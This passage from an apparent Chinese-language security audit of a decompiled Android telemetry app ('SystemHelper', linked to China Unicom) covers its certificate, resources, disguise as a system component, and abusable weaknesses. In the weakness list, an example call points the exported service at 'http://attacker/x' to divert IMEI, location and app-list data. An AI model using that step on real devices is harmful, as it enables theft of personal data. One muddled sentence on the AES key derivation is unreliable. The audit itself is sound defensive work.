Subject       : CN=UNICOM, OU=UNICOM, O=UNICOM, L=BJ, S=BJ, C=CN
Issuer        : CN=UNICOM, OU=UNICOM, O=UNICOM, L=BJ, S=BJ, C=CN   ← 自签名
Serial        : 52 8B 93 60
NotBefore     : 2019-05-24 08:44:27 UTC
NotAfter      : 2119-04-30 08:44:27 UTC      ← 有效期 100 年
Signature Alg : sha256RSA (1.2.840.113549.1.1.11)
Public Key    : RSA 1024 bit
Version       : v3（仅含 SubjectKeyIdentifier 扩展：6D3078…5314）
DER SHA-256   : 810c0122ba6af7a4b6a5921fdbbbf9197fb2e0b2e82de0c5aa40d28f1b7c6501
DER SHA-1     : D81C6EE680DD6A58DD23A8670B064B18B9BD87B1
Subject/Issuer 中文含义 : 中国·北京·联通（UNICOM）
```

PEM：

```
-----BEGIN CERTIFICATE-----
MIICUDCCAbmgAwIBAgIEUouTYDANBgkqhkiG9w0BAQsFADBaMQswCQYDVQQGEwJD
TjELMAkGA1UECBMCQkoxCzAJBgNVBAcTAkJKMQ8wDQYDVQQKEwZVTklDT00xDzAN
BgNVBAsTBlVOSUNPTTEPMA0GA1UEAxMGVU5JQ09NMCAXDTE5MDUyNDA4NDQyN1oY
DzIxMTkwNDMwMDg0NDI3WjBaMQswCQYDVQQGEwJDTjELMAkGA1UECBMCQkoxCzAJ
BgNVBAcTAkJKMQ8wDQYDVQQKEwZVTklDT00xDzANBgNVBAsTBlVOSUNPTTEPMA0G
A1UEAxMGVU5JQ09NMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDB5OUB0H8c
SDBzUckwV95PbJQ7Roa0zeK/Vhge/3oNBhTSiGs9FvxVsdg5EnvwRtrlhajRqlw/
KU0iuTS2L2/yEUBYght91APPUpBHwWf1iV0mPIIqEuX13Xk8KtoMWcrZjJ3uxpO5
m6eIwWlddZX6Xoz5TtsHpIerCzQ8BScpawIDAQABoyEwHzAdBgNVHQ4EFgQUbTB4
FhwVS/xrNV65YHPYq6yzUxQwDQYJKoZIhvcNAQELBQADgYEAOLyKQudC/oy8PUyS
wy5KYcAtq2TM99pZMEvx2NQvmvO8V8JxHyicqP3t1qoClFp3HfmcinP9zDjjW2+L
Hs/xisUOuVT0MC+rGuvVr2WkmF5DNgavOkXXt1Dg64+u5DKOlT64/+GHSIuT8Ebx
btf++jS8fvhImsSBI/6q2HWchaM=
-----END CERTIFICATE-----
```

用途与评价：仅被 `f0/c.c()` → `f0/k.b()` 使用，作为 **RSA 公钥**给上报数据的 MD5 摘要做 `RSA/ECB/PKCS1Padding` 加密（生成 `sign` 参数）。运营方（联通侧）持私钥验签。三点问题：① **RSA-1024**（2019 年即已属弱强度，最大只能加密 117 字节，远小于任何真实报文，所以只能签摘要）；② **自签名、100 年有效期、CN/OU/O 全填 `UNICOM`**，无 CA 链、无使用方标识，任何拿到私钥的一方都能伪造“官方”签名；③ 公钥与业务服务器同域（`dm.wo.com.cn`），说明这是运营商侧签发的历史遗留密钥对。

### 5.2 三条自有字符串（`res/values/strings.xml:42-45`）

| name | 值 | 说明 |
|---|---|---|
| `app_name` | `SystemHelper` | 英文，**`values-zh-rCN` 未覆盖** → 中文系统上仍显示英文名；作为“系统助手”式命名的伪装 |
| `setting_advice_title` | `运营商服务（SystemHelper）` | 自称“运营商服务” |
| `setting_advice_content` | `运营商可能通过 WLAN 或移动数据网络收集您的设备信息等数据，开启即视为同意联网、访问应用列表和定位。` | 隐私声明 |

含义与问题：这两条 `setting_advice_*` **只存在于资源中，全工程无任何代码/布局引用它们**（已 grep `smali` + `res`，仅命中 `strings.xml` 与 `public.xml`），说明原本的“设置/引导页”被删除或未接入，隐私告知实际上**不可见**。文案本身把“开启”当作对“联网 / 读取应用列表（`QUERY_ALL_PACKAGES`）/ 定位”的一揽子同意，属于典型概括授权话术，且未提及 IMEI/IMSI/ICCID/小区/流量等实际采集项。

### 5.3 布局与 XML 配置

- 自有布局只有 1 个：`res/layout/activity_test.xml`（677 B）
  `android.support.constraint.ConstraintLayout` → `ScrollView(368dp, padding 10dp)` → `TextView android:id="@id/tv_device_info"`（`0x7f0700cf`），`android:text="Device Info"`，`scrollbars="vertical"`。
  → UI 仅一屏可滚动纯文本调试输出，**没有任何“设置/开关”控件**（无 Switch/CheckBox/SeekBar/EditText）。所谓“设置界面”在本版本不存在；配置只能通过 AIDL `i()/r()/s()` 或直接改 prefs 完成。
- 其余 38 个 layout 全是 `abc_*` / `notification_*` / `select_dialog_*` / `support_simple_spinner_dropdown_item`（AppCompat + support 库自带）。
- `res/xml/motosystemhelper.xml`（313 B）——**关键**：
  ```xml
  <permissions>
    <privapp-permissions package="com.mobiletools.systemhelper">
      <permission name="android.permission.PACKAGE_USAGE_STATS" />
      <permission name="android.permission.READ_PRIVILEGED_PHONE_STATE" />
    </privapp-permissions>
  </permissions>
  ```
  → 为“预置为 `system/priv-app` 特权应用”准备的白名单文件（装机时须放到 `/system/etc/permissions/motosystemhelper.xml`）。说明该 APK 的目标投放方式是**厂商/定制机预装为特权应用**，从而绕过 `PACKAGE_USAGE_STATS`（应用使用统计）与 `READ_PRIVILEGED_PHONE_STATE`（读 IMEI/IMSI）的运行时授权。文件名 `moto…` 暗示与摩托罗拉/联想系 ROM 的适配。
- `res/xml/network_security_config.xml`（149 B）：`<base-config cleartextTrafficPermitted="true"/>`，但 **manifest 未引用 `android:networkSecurityConfig`** → 该文件是死资源，实际明文放行靠 `android:usesCleartextTraffic="true"`。
- 主题 `AppTheme`（`res/values/styles.xml`）：`parent="Theme.AppCompat.Light.DarkActionBar"`，配色 `colorPrimary=#3f51b5`、`colorPrimaryDark=#303f9f`、`colorAccent=#ff4081` —— **Android Studio 默认模板配色，未做任何视觉定制**。

### 5.4 图标（伪装程度）

`res/mipmap-{m,h,x,xx,xxx}dpi/ic_launcher.png` 与 `ic_launcher_round.png` 共 10 个文件（1.9–14.7 KB）：

- 内容为**经典绿色 Android 机器人（bugdroid）头像**，`round` 版本为白底圆形版；
- 尺寸 48/72/96/144/192 px，标准 AS 模板导出；
- **无任何品牌、运营商（联通/格力/努比亚）、功能语义标识**。

判断：**高度“系统组件化”伪装**——图标直接借用 Android 官方机器人形象、应用名 `SystemHelper`（系统助手）、Activity/Service 命名（`TestActivity`、`RegisterHelperService`）也刻意中性化；配合 `sharedUserId`、privapp 白名单与最高优先级开机广播，目的是在桌面上被用户当作系统自带组件而不去卸载。

### 5.5 `META-INF/com/android/build/gradle/app-metadata.properties`

```
appMetadataVersion=1.1
androidGradlePluginVersion=7.4.1
```

（位于 apktool 的 `unknown\META-INF\com\android\build\gradle\app-metadata.properties`，56 字节。→ 构建链为 AGP 7.4.1，与 `compileSdk 33` 一致。）

### 5.6 `unknown/` 与 `original/` 目录

- `original/AndroidManifest.xml`（8120 B）：apktool 保存的**原始二进制 AXML**（未解码版本），用于回编/对比；与根目录已解码的 `AndroidManifest.xml` 内容一致，无额外隐藏属性（`android:debuggable`、`android:testOnly` 均未出现）。
- `unknown/`：apktool 无法归入 `res/` 的原包文件，共 28 个：
  - `META-INF/androidx.*_*.version`、`android.arch.*_*.version`（22 个 6 字节文件）：AndroidX/Arch 组件的版本标记（构建产物，无情报价值）；
  - `META-INF/com/android/build/gradle/app-metadata.properties`：见 5.5。
  - 无 `META-INF/*.RSA|*.SF|*.MF` 签名文件残留（apktool 默认丢弃），故**无法从反编译目录判断签名指纹**（需回到 APK 用 `apksigner`）。

---

## 6. 安全隐患与可被滥用点

按可利用性排序：

1. **无保护的导出 AIDL 服务 = 远程改配置/改服务器**（`RegisterHelperService`，exported + 无 permission）
   任意应用 bind 后：`r("http://attacker/x")` 即可把后续全部遥测（含 IMEI/IMSI/ICCID/位置/应用清单）**改道至攻击者服务器**；`i(1)` 让上报变成每秒一次；`u()` 删 prefs 造成配置丢失 DoS；`s(true)` 打开日志便于二次收集。
2. **明文 HTTP + 自签名弱密钥的“加密”上报**（`http://dm.wo.com.cn:18080/registerv3`，`application/encrypted-json`）
   - 传输层无 TLS → 同网段可完整嗅探/篡改/重放；
   - `body = AES-ECB(plaintext, key=MD5(plaintext))`：密钥由明文自身派生，**任何截获者都能解密**（先 MD5 密文？不——但因为 key 可枚举/已知结构可暴力校验，实际等价于混淆），ECB 还泄露明文分组重复模式；
   - `sign` 只是 RSA-1024 包 MD5，**无时间戳/nonce**，可重放；RSA-1024 已不可作为长期信任根。
3. **`TestActivity` 作为“权限钓鱼壳”**：任意应用可 `startActivity` 拉起它，向用户弹出 `READ_PHONE_STATE`/定位/网络状态三项系统授权框（文案与来源都显示为本应用），诱导授权后本应用即具备采集能力；targetSdk 28，后台启动 Activity 不受 Android 10+ 限制。
4. **可被外部触发的采集/上报放大器**：`OnBootReceiver`、`SIMStateReceiver` 均 exported 且用“action 是否匹配”做分支，任意 action（或 null）都会落到“立刻上报 / 挂 alarm”分支 → 外部应用可反复触发上报、放大流量与电量消耗，也可用来探测应用是否安装。
5. **`sharedUserId="com.mobiletools.systemhelper.uid"` + `sharedUserMaxSdkVersion=32`**：为与同开发者/同签名的其它 `com.mobiletools.*` 应用共享 UID 预留；一旦被预置进系统，同 UID 应用可直接读写本应用 prefs/DB（跨应用数据面）。
6. **`android:priority="2147483647"`**：把开机广播优先级顶到 int 上限，属明确的“抢跑”手法（对 `BOOT_COMPLETED` 在旧版本上可影响有序广播顺序）。
7. **privapp 白名单 + 高敏权限**：`motosystemhelper.xml` 申请 `PACKAGE_USAGE_STATS`、`READ_PRIVILEGED_PHONE_STATE`；清单另声明 `QUERY_ALL_PACKAGES`、`ACCESS_BACKGROUND_LOCATION`、`SCHEDULE_EXACT_ALARM`、`READ_EXTERNAL_STORAGE`。合起来是“静默、后台、全量设备画像”的能力集合，与“SystemHelper/运营商服务”的表面定位严重不匹配。
8. **隐私告知不可达**：`setting_advice_*` 字符串无任何引用，UI 里也没有设置/开关页 → 用户既看不到采集说明，也无法关闭采集（无 UI 开关；`f0/f.g` 只能由代码改）。
9. **实现级缺陷**（可被本地攻击者/取证利用）：`MODE_MULTI_PROCESS` prefs（一致性风险）、`f0/l.a()` 硬编码 `/data/data/...` 绝对路径（多用户/分屏环境失效）、`f0/d.c()` 用 `jsonString` 值做删除条件（同值多条会被误删）、`f0/a.b()` 复用同一 PendingIntent（4 分钟自唤醒与 3 秒重试互相覆盖）、`f0/j` 长消息切片 off-by-one、`f0/h` 异常路径可能 NPE、`RegisterJobService` 为死组件。
10. **未使用的签名级自定义权限**（`com.mobiletools.systemhelper.permission`）：本可用于保护 `RegisterHelperService`，但未使用 —— 直接放大了第 1 条。

---

## 7. 未知项

1. **`e0/r.k` / `e0/r.s` 的确切行为**（是否弹权限、申请哪些权限、是否有 OEM 判断）：属他人范围，本文仅记录所有调用点（DMApplication、OnBootReceiver、SIMStateReceiver、ScheduleRegisterReceiver、AppInfoRegisterReceiver、TestActivity、RegisterHelperService.onCreate）与触发条件（SDK≥30 / SDK≥31）。
2. **`e0/c2.h(ctx)` 返回的 `c` 子类型（`e0/z0` / `e0/c0` / `e0/e0`）与具体 OEM 的映射**：只确认了 `z0`→努比亚 `NBExtTelephony`、`c0`/`e0`→格力 `GreeTelephonyManager` 的绑定分支（`RegisterIntentService.onCreate`）；配置判定逻辑在他人范围内。
3. **`d0/g` bean 的 40+ 字段语义**（上报 JSON 的最终字段名/含义）：本文只用到 `d()`（序列化）、`M`（history 数组）、`N`（signal 数组）、`a/b/B/k/v`（model/manufact/DataSlot/NetworkOperator/NetworkOperatorSlot2）；完整字段表应由 `d0/*` 负责人给出。
4. **`signal` 表的写入方**：本版本没有任何 insert 路径（`f0/m` 无 insert 方法，全工程无 raw SQL），`d0/f` 只取实例不写；推测为上游版本残留或依赖反射/未来版本。无法从本 APK 证实写入时机。
5. **`serverAddress` 的真实服务端能力**：`http://dm.wo.com.cn:18080` 是否为联通现网在用端点、返回 416 的具体判定含义（“已注册”？）需服务端侧证据，本地无法确认。
6. **签名证书/是否预置**：反编译目录丢失 `META-INF` 签名，无法判断与 `com.mobiletools.*` 家族其它应用的签名一致性；`privapp` 白名单是否真的被某 ROM 采用无法从 APK 推断。
7. **`u/j`（`R$styleable`）231 个字段的逐个名称**：本次只做了数量与数组结构导出（24 个 `int[]`），未展开成 `abc_xxx` 属性名——因其全部是 AppCompat 内部属性集，情报价值低，若需要可另行用 `public.xml` + `attr` 名反查。
8. **`f0/l.j/k`（`SystemProperties` 反射）的实际 key 清单**：调用点全在 `e0/*`（如 `ro.build.version.*`、`gsm.sim.*`），key 字面量由各采集器传入，属他人范围；本文只确认了 API 形状（1 参 / 2 参 / 兜底 `"unknown"`）。

---

### 附：本文涉及的关键文件（供复核）

- 清单：`apktool\AndroidManifest.xml`
- 组件：`apktool\smali\com\mobiletools\systemhelper\{Activity,control,service}\*.smali`
- 工具层：`apktool\smali\f0\{a..o}.smali`（`f0/l.smali` 778 行、`f0/i.smali` 745 行已全文通读）
- 常量：`apktool\smali\f0\f.smali`、`apktool\smali\u\{a..j}.smali`、`apktool\res\values\public.xml`
- 资源：`apktool\res\{layout\activity_test.xml, xml\motosystemhelper.xml, xml\network_security_config.xml, values\strings.xml, values\styles.xml}`、`apktool\assets\pub.cer`
- 契约调用点（跨模块）：`apktool\smali\d0\k.smali`（POST 组装）、`apktool\smali\d0\j.smali`（signal 读取）、`apktool\smali\d0\h.smali`（出口 IP）
